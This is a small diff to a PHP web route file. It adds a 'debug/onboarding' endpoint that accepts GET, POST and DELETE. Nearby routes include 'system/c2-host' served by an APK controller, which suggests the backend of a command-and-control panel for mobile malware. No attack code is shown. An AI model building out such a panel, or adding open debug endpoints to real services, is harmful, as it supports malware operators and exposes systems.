@@ -43,6 +43,9 @@ $apiRoutes = function () {
     Route::get('system/debug/connections', 'MiscController/debugConnections');
     Route::get('system/c2-host', 'ApkController/c2Host');
 
+    // ========== New-device onboarding debug ==========
+    Route::rule('debug/onboarding', 'DebugController/onboarding', 'GET|POST|DELETE');
+
     // ========== License ==========
     Route::get('license/max-users', 'MiscController/maxUsers');
 
